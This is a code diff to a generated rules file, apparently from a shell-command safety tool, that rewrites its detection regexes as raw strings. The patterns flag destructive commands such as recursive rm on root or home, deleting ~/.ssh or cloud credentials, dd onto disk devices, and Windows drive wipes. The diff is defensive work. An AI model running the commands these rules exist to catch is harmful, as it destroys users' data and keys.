@@ -12,7 +12,7 @@ export const GENERATED = {
 				"This deletes a critical location: the filesystem root, your home directory, a system directory, the repository, or everything in the current directory.",
 			feed: "parsed",
 			regex:
-				"^rm\\s+(?:\\S+\\s+)*?(?:-[a-zA-Z]*[rRf][a-zA-Z]*|--recursive|--force)\\s+(?:\\S+\\s+)*?(\\/\\*?|~(?:\\/\\*)?|\\$HOME(?:\\/\\*)?|\\.\\.?(?:\\/\\.\\.)*(?:\\/\\*)?|\\*|\\.git(?:\\/(?:\\*|objects|refs|logs|index|HEAD)(?:\\/\\S*)?)?|\\/(?:home|Users)\\/[^/\\s*]+(?:\\/\\*)?|\\/System\\/Volumes\\/Data(?:\\/[^\\s]*)?|\\/(?:home|etc|usr|var|bin|sbin|lib|lib64|boot|opt|root|srv|sys|proc|dev|System|Users|Library|Applications)(?:\\/\\*)?)(?:\\s|$)",
+				String.raw`^rm\s+(?:\S+\s+)*?(?:-[a-zA-Z]*[rRf][a-zA-Z]*|--recursive|--force)\s+(?:\S+\s+)*?(\/\*?|~(?:\/\*)?|\$HOME(?:\/\*)?|\.\.?(?:\/\.\.)*(?:\/\*)?|\*|\.git(?:\/(?:\*|objects|refs|logs|index|HEAD)(?:\/\S*)?)?|\/(?:home|Users)\/[^/\s*]+(?:\/\*)?|\/System\/Volumes\/Data(?:\/[^\s]*)?|\/(?:home|etc|usr|var|bin|sbin|lib|lib64|boot|opt|root|srv|sys|proc|dev|System|Users|Library|Applications)(?:\/\*)?)(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -23,7 +23,7 @@ export const GENERATED = {
 				"This deletes SSH keys, GPG keys or cloud / cluster credentials from your home directory.",
 			feed: "parsed",
 			regex:
-				"^(?:rm|unlink|shred|srm)\\s+(?:\\S+\\s+)*?((?:~|\\$HOME|\\/home\\/[^/\\s]+|\\/Users\\/[^/\\s]+|\\/root)\\/\\.(?:ssh|gnupg|aws|kube|azure|docker|password-store|config\\/gcloud)(?:\\/\\S*)?)(?:\\s|$)",
+				String.raw`^(?:rm|unlink|shred|srm)\s+(?:\S+\s+)*?((?:~|\$HOME|\/home\/[^/\s]+|\/Users\/[^/\s]+|\/root)\/\.(?:ssh|gnupg|aws|kube|azure|docker|password-store|config\/gcloud)(?:\/\S*)?)(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -34,12 +34,12 @@ export const GENERATED = {
 				"This erases a disk or volume with diskutil: all data on it is lost.",
 			feed: "parsed",
 			regex:
-				"^diskutil\\s+(?:\\S+\\s+)*?(?:eraseDisk|eraseVolume|zeroDisk|randomDisk|secureErase|partitionDisk|reformat|apfs\\s+(?:deleteContainer|deleteVolume|eraseVolume|eraseDisk))(?:\\s|$)",
+				String.raw`^diskutil\s+(?:\S+\s+)*?(?:eraseDisk|eraseVolume|zeroDisk|randomDisk|secureErase|partitionDisk|reformat|apfs\s+(?:deleteContainer|deleteVolume|eraseVolume|eraseDisk))(?:\s|$)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
-					value: "(?:^|\\s)secureErase\\s+freespace(?:\\s|$)",
+					value: String.raw`(?:^|\s)secureErase\s+freespace(?:\s|$)`,
 				},
 			],
 		},
@@ -50,7 +50,7 @@ export const GENERATED = {
 				"This writes straight onto a disk device, overwriting the partition table and file systems on it.",
 			feed: "parsed",
 			regex:
-				"(?:(?:^|\\s)\\d*>>?\\|?\\s*|(?:^|\\s)tee\\s+(?:-\\S+\\s+)*|(?:^|\\s)cp\\s+(?:-\\S+\\s+)*\\S+\\s+)(\\/dev\\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|dm-[0-9]+|mapper\\/[^\\s/]+|disk\\/by-[a-z-]+\\/[^\\s/]+))(?:\\s|$)",
+				String.raw`(?:(?:^|\s)\d*>>?\|?\s*|(?:^|\s)tee\s+(?:-\S+\s+)*|(?:^|\s)cp\s+(?:-\S+\s+)*\S+\s+)(\/dev\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|dm-[0-9]+|mapper\/[^\s/]+|disk\/by-[a-z-]+\/[^\s/]+))(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -61,7 +61,7 @@ export const GENERATED = {
 				"This erases or sanitizes an NVMe device at the controller level: all data on it is lost.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)nvme\\s+(?:format|sanitize)\\s+(?:\\S+\\s+)*?\\/dev\\/(?:nvme[0-9]+(?:n[0-9]+)?(?:p[0-9]+)?|ng[0-9]+n[0-9]+)(?:\\s|$)",
+				String.raw`(?:^|\s)nvme\s+(?:format|sanitize)\s+(?:\S+\s+)*?\/dev\/(?:nvme[0-9]+(?:n[0-9]+)?(?:p[0-9]+)?|ng[0-9]+n[0-9]+)(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -72,7 +72,7 @@ export const GENERATED = {
 				"This deletes a whole Windows drive, the user profiles or the Windows directory, with every file and folder in it.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)(?:rmdir|rd|del|erase)(?:(?:\\s+\\S+)*?\\s+)?(?:\\/[a-z])*\\/s(?:\\/[a-z])*(?:\\s+\\S+)*?\\s+((?:[a-z]:\\/?|[a-z]:\\/Users(?:\\/[^/\\s*]+(?:\\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\\s]*|\\.ssh))?)?\\/?|[a-z]:\\/Windows(?:\\/System32)?\\/?|%(?:USERPROFILE|HOMEDRIVE|HOMEPATH|SystemDrive|SystemRoot|windir|APPDATA|LOCALAPPDATA|ProgramData)%(?:%HOMEPATH%)?(?:\\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\\s]*|\\.ssh))?\\/?)(?:\\*(?:\\.\\*)?)?)(?:\\s|$)|(?:^|\\s)(?:rmdir|rd|del|erase)\\s+(?:\\S+\\s+)*?((?:[a-z]:\\/?|[a-z]:\\/Users(?:\\/[^/\\s*]+(?:\\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\\s]*|\\.ssh))?)?\\/?|[a-z]:\\/Windows(?:\\/System32)?\\/?|%(?:USERPROFILE|HOMEDRIVE|HOMEPATH|SystemDrive|SystemRoot|windir|APPDATA|LOCALAPPDATA|ProgramData)%(?:%HOMEPATH%)?(?:\\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\\s]*|\\.ssh))?\\/?)(?:\\*(?:\\.\\*)?)?)\\s+(?:\\S+\\s+)*?(?:\\/[a-z])*\\/s(?:\\/[a-z])*(?:\\s|$)",
+				String.raw`(?:^|\s)(?:rmdir|rd|del|erase)(?:(?:\s+\S+)*?\s+)?(?:\/[a-z])*\/s(?:\/[a-z])*(?:\s+\S+)*?\s+((?:[a-z]:\/?|[a-z]:\/Users(?:\/[^/\s*]+(?:\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\s]*|\.ssh))?)?\/?|[a-z]:\/Windows(?:\/System32)?\/?|%(?:USERPROFILE|HOMEDRIVE|HOMEPATH|SystemDrive|SystemRoot|windir|APPDATA|LOCALAPPDATA|ProgramData)%(?:%HOMEPATH%)?(?:\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\s]*|\.ssh))?\/?)(?:\*(?:\.\*)?)?)(?:\s|$)|(?:^|\s)(?:rmdir|rd|del|erase)\s+(?:\S+\s+)*?((?:[a-z]:\/?|[a-z]:\/Users(?:\/[^/\s*]+(?:\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\s]*|\.ssh))?)?\/?|[a-z]:\/Windows(?:\/System32)?\/?|%(?:USERPROFILE|HOMEDRIVE|HOMEPATH|SystemDrive|SystemRoot|windir|APPDATA|LOCALAPPDATA|ProgramData)%(?:%HOMEPATH%)?(?:\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\s]*|\.ssh))?\/?)(?:\*(?:\.\*)?)?)\s+(?:\S+\s+)*?(?:\/[a-z])*\/s(?:\/[a-z])*(?:\s|$)`,
 			flags: "i",
 			filters: [],
 		},
@@ -83,7 +83,7 @@ export const GENERATED = {
 				"This deletes a whole Windows drive, your user profile or the Windows directory, with every file and folder in it.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)(?:Remove-Item|ri|rm|rmdir|rd|del|erase)\\s+(?:\\S+\\s+)*?-r[a-z]*(?::\\$true)?(?:\\s+\\S+)*?\\s+(?:-(?:Path|LiteralPath):)?((?:[a-z]:\\/?|[a-z]:\\/Users(?:\\/[^/\\s*]+(?:\\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\\s]*|\\.ssh))?)?\\/?|[a-z]:\\/Windows(?:\\/System32)?\\/?|\\$\\{?env:(?:USERPROFILE|HOMEDRIVE|HOMEPATH|SystemDrive|SystemRoot|windir|APPDATA|LOCALAPPDATA|ProgramData)\\}?(?:\\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\\s]*|\\.ssh))?\\/?)(?:\\*(?:\\.\\*)?)?)(?:\\s|$)|(?:^|\\s)(?:Remove-Item|ri|rm|rmdir|rd|del|erase)\\s+(?:\\S+\\s+)*?(?:-(?:Path|LiteralPath):)?((?:[a-z]:\\/?|[a-z]:\\/Users(?:\\/[^/\\s*]+(?:\\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\\s]*|\\.ssh))?)?\\/?|[a-z]:\\/Windows(?:\\/System32)?\\/?|\\$\\{?env:(?:USERPROFILE|HOMEDRIVE|HOMEPATH|SystemDrive|SystemRoot|windir|APPDATA|LOCALAPPDATA|ProgramData)\\}?(?:\\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\\s]*|\\.ssh))?\\/?)(?:\\*(?:\\.\\*)?)?)\\s+(?:\\S+\\s+)*?-r[a-z]*(?::\\$true)?(?:\\s|$)|(?:^|\\s)(?:Remove-Item|ri)\\s+(?:\\S+\\s+)*?-r[a-z]*(?::\\$true)?(?:\\s+\\S+)*?\\s+(?:-(?:Path|LiteralPath):)?((?:~|\\$HOME|\\$\\{HOME\\})(?:\\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\\s]*|\\.ssh))?\\/?(?:\\*(?:\\.\\*)?)?)(?:\\s|$)|(?:^|\\s)(?:Remove-Item|ri)\\s+(?:\\S+\\s+)*?(?:-(?:Path|LiteralPath):)?((?:~|\\$HOME|\\$\\{HOME\\})(?:\\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\\s]*|\\.ssh))?\\/?(?:\\*(?:\\.\\*)?)?)\\s+(?:\\S+\\s+)*?-r[a-z]*(?::\\$true)?(?:\\s|$)",
+				String.raw`(?:^|\s)(?:Remove-Item|ri|rm|rmdir|rd|del|erase)\s+(?:\S+\s+)*?-r[a-z]*(?::\$true)?(?:\s+\S+)*?\s+(?:-(?:Path|LiteralPath):)?((?:[a-z]:\/?|[a-z]:\/Users(?:\/[^/\s*]+(?:\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\s]*|\.ssh))?)?\/?|[a-z]:\/Windows(?:\/System32)?\/?|\$\{?env:(?:USERPROFILE|HOMEDRIVE|HOMEPATH|SystemDrive|SystemRoot|windir|APPDATA|LOCALAPPDATA|ProgramData)\}?(?:\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\s]*|\.ssh))?\/?)(?:\*(?:\.\*)?)?)(?:\s|$)|(?:^|\s)(?:Remove-Item|ri|rm|rmdir|rd|del|erase)\s+(?:\S+\s+)*?(?:-(?:Path|LiteralPath):)?((?:[a-z]:\/?|[a-z]:\/Users(?:\/[^/\s*]+(?:\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\s]*|\.ssh))?)?\/?|[a-z]:\/Windows(?:\/System32)?\/?|\$\{?env:(?:USERPROFILE|HOMEDRIVE|HOMEPATH|SystemDrive|SystemRoot|windir|APPDATA|LOCALAPPDATA|ProgramData)\}?(?:\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\s]*|\.ssh))?\/?)(?:\*(?:\.\*)?)?)\s+(?:\S+\s+)*?-r[a-z]*(?::\$true)?(?:\s|$)|(?:^|\s)(?:Remove-Item|ri)\s+(?:\S+\s+)*?-r[a-z]*(?::\$true)?(?:\s+\S+)*?\s+(?:-(?:Path|LiteralPath):)?((?:~|\$HOME|\$\{HOME\})(?:\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\s]*|\.ssh))?\/?(?:\*(?:\.\*)?)?)(?:\s|$)|(?:^|\s)(?:Remove-Item|ri)\s+(?:\S+\s+)*?(?:-(?:Path|LiteralPath):)?((?:~|\$HOME|\$\{HOME\})(?:\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\s]*|\.ssh))?\/?(?:\*(?:\.\*)?)?)\s+(?:\S+\s+)*?-r[a-z]*(?::\$true)?(?:\s|$)`,
 			flags: "i",
 			filters: [],
 		},
@@ -94,7 +94,7 @@ export const GENERATED = {
 				"This lists a whole Windows drive or your user profile and pipes every item into a delete.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)(?:Get-ChildItem|gci|dir|ls)[ \\t]+(?:[^\\s|;&]+[ \\t]+)*?(?:-(?:Path|LiteralPath):)?((?:[a-z]:\\/?|[a-z]:\\/Users(?:\\/[^/\\s*]+(?:\\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\\s]*|\\.ssh))?)?\\/?|[a-z]:\\/Windows(?:\\/System32)?\\/?|\\$\\{?env:(?:USERPROFILE|HOMEDRIVE|HOMEPATH|SystemDrive|SystemRoot|windir|APPDATA|LOCALAPPDATA|ProgramData)\\}?(?:\\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\\s]*|\\.ssh))?\\/?)(?:\\*(?:\\.\\*)?)?|(?:~|\\$HOME|\\$\\{HOME\\})(?:\\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\\s]*|\\.ssh))?\\/?(?:\\*(?:\\.\\*)?)?)(?:[ \\t]+[^\\s|;&]+)*?[ \\t]*\\|[ \\t]*(?:Remove-Item|ri|rm|rmdir|rd|del|erase)(?:[ \\t]+-\\S+(?:[ \\t]+(?:0|[1-9]|SilentlyContinue|Ignore|Continue|Stop|\\$true|\\$false))?)*[ \\t]*(?:$|[|;\\n])",
+				String.raw`(?:^|\s)(?:Get-ChildItem|gci|dir|ls)[ \t]+(?:[^\s|;&]+[ \t]+)*?(?:-(?:Path|LiteralPath):)?((?:[a-z]:\/?|[a-z]:\/Users(?:\/[^/\s*]+(?:\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\s]*|\.ssh))?)?\/?|[a-z]:\/Windows(?:\/System32)?\/?|\$\{?env:(?:USERPROFILE|HOMEDRIVE|HOMEPATH|SystemDrive|SystemRoot|windir|APPDATA|LOCALAPPDATA|ProgramData)\}?(?:\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\s]*|\.ssh))?\/?)(?:\*(?:\.\*)?)?|(?:~|\$HOME|\$\{HOME\})(?:\/(?:Documents|Desktop|Downloads|Pictures|Videos|Music|AppData|OneDrive[^/\s]*|\.ssh))?\/?(?:\*(?:\.\*)?)?)(?:[ \t]+[^\s|;&]+)*?[ \t]*\|[ \t]*(?:Remove-Item|ri|rm|rmdir|rd|del|erase)(?:[ \t]+-\S+(?:[ \t]+(?:0|[1-9]|SilentlyContinue|Ignore|Continue|Stop|\$true|\$false))?)*[ \t]*(?:$|[|;\n])`,
 			flags: "i",
 			filters: [],
 		},
@@ -105,7 +105,7 @@ export const GENERATED = {
 				"This formats a Windows drive or wipes a disk, erasing all data on it.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)format(?:\\.com)?\\s+(?:\\/\\S+\\s+)*[a-z]:(?:\\s|$)|^(?:Format-Volume|Clear-Disk|Initialize-Disk|Remove-Partition|Reset-PhysicalDisk)(?:\\s|$)|(?:^|\\s)diskpart(?:\\.exe)?\\s+(?:\\S+\\s+)*?\\/s(?:\\s|$)",
+				String.raw`(?:^|\s)format(?:\.com)?\s+(?:\/\S+\s+)*[a-z]:(?:\s|$)|^(?:Format-Volume|Clear-Disk|Initialize-Disk|Remove-Partition|Reset-PhysicalDisk)(?:\s|$)|(?:^|\s)diskpart(?:\.exe)?\s+(?:\S+\s+)*?\/s(?:\s|$)`,
 			flags: "i",
 			filters: [],
 		},
@@ -116,18 +116,18 @@ export const GENERATED = {
 				"This recursively deletes a top-level folder of your home directory (for example `~/projects` or `~/data`), or a directory outside the current one reached with `../`.",
 			feed: "parsed",
 			regex:
-				"^rm\\s+(?:\\S+\\s+)*?(?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\\s+(?:\\S+\\s+)*?((?:~|\\$HOME|\\/home\\/[^/\\s]+|\\/Users\\/[^/\\s]+|\\/root)\\/[^/\\s*]+|(?:\\.\\.\\/)+[^/\\s.][^\\s]*|(?:\\.\\.\\/)+\\.[^/\\s.][^\\s]*)(?:\\s|$)",
+				String.raw`^rm\s+(?:\S+\s+)*?(?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\s+(?:\S+\s+)*?((?:~|\$HOME|\/home\/[^/\s]+|\/Users\/[^/\s]+|\/root)\/[^/\s*]+|(?:\.\.\/)+[^/\s.][^\s]*|(?:\.\.\/)+\.[^/\s.][^\s]*)(?:\s|$)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
 					value:
-						"^rm\\s+(?:-\\S+\\s+)*(?:(?:/var/lib/apt/lists|/var/cache/(?:apt|apk|yum|dnf|debconf|pacman/pkg)|/root/\\.cache|~/\\.cache|\\$HOME/\\.cache|/root/\\.npm/_cacache|/usr/share/doc|/usr/share/man)(?:/\\S*)?(?:\\s+|$))+$",
+						String.raw`^rm\s+(?:-\S+\s+)*(?:(?:/var/lib/apt/lists|/var/cache/(?:apt|apk|yum|dnf|debconf|pacman/pkg)|/root/\.cache|~/\.cache|\$HOME/\.cache|/root/\.npm/_cacache|/usr/share/doc|/usr/share/man)(?:/\S*)?(?:\s+|$))+$`,
 				},
 				{
 					type: "NotMatches",
 					value:
-						"^rm\\s+(?:-[a-zA-Z]+\\s+)*(?:(?:~|\\$HOME|\\$\\{HOME\\}|\\$ZDOTDIR|\\$\\{ZDOTDIR(?::-[^}\\s]*)?\\}|/home/[^/\\s]+|/Users/[^/\\s]+|/root)/\\.zcompdump[^\\s/]*(?:\\s+|$))+$",
+						String.raw`^rm\s+(?:-[a-zA-Z]+\s+)*(?:(?:~|\$HOME|\$\{HOME\}|\$ZDOTDIR|\$\{ZDOTDIR(?::-[^}\s]*)?\}|/home/[^/\s]+|/Users/[^/\s]+|/root)/\.zcompdump[^\s/]*(?:\s+|$))+$`,
 				},
 			],
 		},
@@ -137,7 +137,7 @@ export const GENERATED = {
 			description:
 				"This recursively deletes a whole git repository, including any work that was never pushed.",
 			feed: "parsed",
-			regex: "^shellfirm-delete-repository\\s",
+			regex: String.raw`^shellfirm-delete-repository\s`,
 			flags: "",
 			filters: [],
 		},
@@ -147,7 +147,7 @@ export const GENERATED = {
 			description:
 				"This deletes the .git directory of a repository: its whole history, branches, stashes and every commit that was never pushed.",
 			feed: "parsed",
-			regex: "^shellfirm-delete-git-dir\\s",
+			regex: String.raw`^shellfirm-delete-git-dir\s`,
 			flags: "",
 			filters: [],
 		},
@@ -157,7 +157,7 @@ export const GENERATED = {
 			description:
 				"This moves a folder with work git does not have to a scratch folder that is cleared on its own.",
 			feed: "parsed",
-			regex: "^shellfirm-move-work-away\\s",
+			regex: String.raw`^shellfirm-move-work-away\s`,
 			flags: "",
 			filters: [],
 		},
@@ -167,7 +167,7 @@ export const GENERATED = {
 			description:
 				"This deletes or overwrites a path you marked as sensitive (context.sensitive_paths).",
 			feed: "parsed",
-			regex: "^shellfirm-sensitive-path\\s",
+			regex: String.raw`^shellfirm-sensitive-path\s`,
 			flags: "",
 			filters: [],
 		},
@@ -177,7 +177,7 @@ export const GENERATED = {
 			description: "Moving files to /dev/null destroys them.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)mv\\s+(?:-\\S+\\s+)*([^-\\s]\\S*)(?:\\s+\\S+)*\\s+\\/dev\\/null(?:\\s|$)",
+				String.raw`(?:^|\s)mv\s+(?:-\S+\s+)*([^-\s]\S*)(?:\s+\S+)*\s+\/dev\/null(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -188,17 +188,17 @@ export const GENERATED = {
 				"Recursively changing permissions on the root, home or current directory can break the system and SSH keys.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)chmod\\s+(?:\\S+\\s+)*(?:-[a-zA-Z]*R[a-zA-Z]*|--recursive)\\s+(?:\\S+\\s+)*(\\/\\*?|~(?:\\/\\*)?|\\$HOME(?:\\/\\*)?|\\.+|\\*|\\/(?:home|etc|usr|var|bin|sbin|lib|lib64|boot|opt|root|srv|Users|Library|System)(?:\\/\\*)?|\\/(?:home|Users)\\/[^/\\s]+\\/?\\*?)(?:\\s|$)",
+				String.raw`(?:^|\s)chmod\s+(?:\S+\s+)*(?:-[a-zA-Z]*R[a-zA-Z]*|--recursive)\s+(?:\S+\s+)*(\/\*?|~(?:\/\*)?|\$HOME(?:\/\*)?|\.+|\*|\/(?:home|etc|usr|var|bin|sbin|lib|lib64|boot|opt|root|srv|Users|Library|System)(?:\/\*)?|\/(?:home|Users)\/[^/\s]+\/?\*?)(?:\s|$)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
 					value:
-						"^chmod(?:\\s+-\\S+)*\\s+(?:u+\\+[rwxXst]+|[ugoa]*\\+[rX]+|[go]+-[rwxXst]+)(?:,(?:u+\\+[rwxXst]+|[ugoa]*\\+[rX]+|[go]+-[rwxXst]+))*(?:\\s+-\\S+)*(?:\\s+(?:\\.{1,2}|\\*|~|\\$HOME|/(?:home|Users)/[^/\\s]+)(?:/\\S*)?)+$",
+						String.raw`^chmod(?:\s+-\S+)*\s+(?:u+\+[rwxXst]+|[ugoa]*\+[rX]+|[go]+-[rwxXst]+)(?:,(?:u+\+[rwxXst]+|[ugoa]*\+[rX]+|[go]+-[rwxXst]+))*(?:\s+-\S+)*(?:\s+(?:\.{1,2}|\*|~|\$HOME|/(?:home|Users)/[^/\s]+)(?:/\S*)?)+$`,
 				},
 				{
 					type: "NotMatches",
-					value: "^chmod(?:\\s+-\\S+)*\\s+0?755(?:\\s+-\\S+)*\\s+\\.(?:/)?$",
+					value: String.raw`^chmod(?:\s+-\S+)*\s+0?755(?:\s+-\S+)*\s+\.(?:/)?$`,
 				},
 			],
 		},
@@ -209,7 +209,7 @@ export const GENERATED = {
 				"This changes the permissions of your SSH or GnuPG keys so that other users can read them (ssh then refuses the keys), or so that nobody can.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)chmod\\s+(?:(?:-\\S+\\s+)*(?:-[a-zA-Z]*R[a-zA-Z]*|--recursive)\\s+(?:-\\S+\\s+)*(?:0?[0-7][0-7][1-7]|0?[0-7][1-7][0-7]|0?000|(?:[ugoa]*[goa][ugoa]*)?[+=][rwxXst]+)|(?:-\\S+\\s+)*(?:0?[0-7][0-7][2367]|0?[0-7][2367][0-7]|0?000|(?:[ugoa]*[goa][ugoa]*)?[+=][rwxXst]*w[rwxXst]*))\\s+(?:\\S+\\s+)*?(?:~|\\$HOME|\\/(?:home|Users)\\/[^/\\s]+)\\/\\.(?:ssh|gnupg)(?:\\/\\S*)?(?:\\s|$)",
+				String.raw`(?:^|\s)chmod\s+(?:(?:-\S+\s+)*(?:-[a-zA-Z]*R[a-zA-Z]*|--recursive)\s+(?:-\S+\s+)*(?:0?[0-7][0-7][1-7]|0?[0-7][1-7][0-7]|0?000|(?:[ugoa]*[goa][ugoa]*)?[+=][rwxXst]+)|(?:-\S+\s+)*(?:0?[0-7][0-7][2367]|0?[0-7][2367][0-7]|0?000|(?:[ugoa]*[goa][ugoa]*)?[+=][rwxXst]*w[rwxXst]*))\s+(?:\S+\s+)*?(?:~|\$HOME|\/(?:home|Users)\/[^/\s]+)\/\.(?:ssh|gnupg)(?:\/\S*)?(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -219,18 +219,18 @@ export const GENERATED = {
 			description:
 				"find -delete without a name, time or size filter deletes everything under the path: here the filesystem root, your home directory, a system directory, the repository or the current directory.",
 			feed: "parsed",
-			regex: "(?:^|\\s)find\\s.*\\s-delete(\\s|$)",
+			regex: String.raw`(?:^|\s)find\s.*\s-delete(\s|$)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
 					value:
-						"\\s-(?:i?name|i?path|i?wholename|i?regex|newer\\S*|[ac]newer|[amc](?:time|min)|size|user|group|[ug]id|perm|empty|links|inum|samefile|i?lname|used)\\s(?:.*\\s)?-delete(?:\\s|$)",
+						String.raw`\s-(?:i?name|i?path|i?wholename|i?regex|newer\S*|[ac]newer|[amc](?:time|min)|size|user|group|[ug]id|perm|empty|links|inum|samefile|i?lname|used)\s(?:.*\s)?-delete(?:\s|$)`,
 				},
 				{
 					type: "Matches",
 					value:
-						"(?:^|\\s)find\\s+(?:-[HLP]\\s+)*(?:[^-\\s(!]\\S*\\s+)*?(?:/\\*?|~(?:/[^/\\s]+)?|\\$HOME(?:/[^/\\s]+)?|\\.\\.?(?:/\\S*)?|\\*|\\.git(?:/\\S*)?|\\$\\{?\\w+\\}?\\S*|\\{\\}|/(?:home|Users)/[^/\\s]+(?:/[^/\\s]+)?|/(?:home|etc|usr|var|bin|sbin|lib|lib64|boot|opt|root|srv|sys|proc|dev|System|Users|Library|Applications)(?:/[^/\\s]+)?)(?:\\s|$)",
+						String.raw`(?:^|\s)find\s+(?:-[HLP]\s+)*(?:[^-\s(!]\S*\s+)*?(?:/\*?|~(?:/[^/\s]+)?|\$HOME(?:/[^/\s]+)?|\.\.?(?:/\S*)?|\*|\.git(?:/\S*)?|\$\{?\w+\}?\S*|\{\}|/(?:home|Users)/[^/\s]+(?:/[^/\s]+)?|/(?:home|etc|usr|var|bin|sbin|lib|lib64|boot|opt|root|srv|sys|proc|dev|System|Users|Library|Applications)(?:/[^/\s]+)?)(?:\s|$)`,
 				},
 			],
 		},
@@ -241,13 +241,13 @@ export const GENERATED = {
 				"find -delete under the filesystem root, your home directory or a system directory deletes every matching file there.",
 			feed: "parsed",
 			regex:
-				"^find\\s+(?:-[HLP]\\s+)*(?:[^-\\s(!]\\S*\\s+)*?(?:\\/|~|\\$HOME|\\/(?:home|etc|usr|var|bin|sbin|lib|lib64|boot|opt|root|srv|sys|proc|dev|System|Users|Library|Applications))\\s(?:.*\\s)?-delete(?:\\s|$)",
+				String.raw`^find\s+(?:-[HLP]\s+)*(?:[^-\s(!]\S*\s+)*?(?:\/|~|\$HOME|\/(?:home|etc|usr|var|bin|sbin|lib|lib64|boot|opt|root|srv|sys|proc|dev|System|Users|Library|Applications))\s(?:.*\s)?-delete(?:\s|$)`,
 			flags: "",
 			filters: [
 				{
 					type: "Matches",
 					value:
-						"\\s-(?:i?name|i?path|i?wholename|i?regex|newer\\S*|[ac]newer|[amc](?:time|min)|size|user|group|[ug]id|perm|empty|links|inum|samefile|i?lname|used)\\s(?:.*\\s)?-delete(?:\\s|$)",
+						String.raw`\s-(?:i?name|i?path|i?wholename|i?regex|newer\S*|[ac]newer|[amc](?:time|min)|size|user|group|[ug]id|perm|empty|links|inum|samefile|i?lname|used)\s(?:.*\s)?-delete(?:\s|$)`,
 				},
 			],
 		},
@@ -258,7 +258,7 @@ export const GENERATED = {
 				"Writing directly to a block device can overwrite the whole disk.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)dd\\s+(?:\\S+\\s+)*?of=(\\/dev\\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\\/[^\\s/]+|dm-[0-9]+|mapper\\/[^\\s/]+|disk\\/by-[a-z-]+\\/[^\\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\\w.-]*\\/[\\w.+-]+))(?:\\s|$)",
+				String.raw`(?:^|\s)dd\s+(?:\S+\s+)*?of=(\/dev\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\/[^\s/]+|dm-[0-9]+|mapper\/[^\s/]+|disk\/by-[a-z-]+\/[^\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\w.-]*\/[\w.+-]+))(?:\s|$)`,
 			flags: "",
 			filters: [
 				{
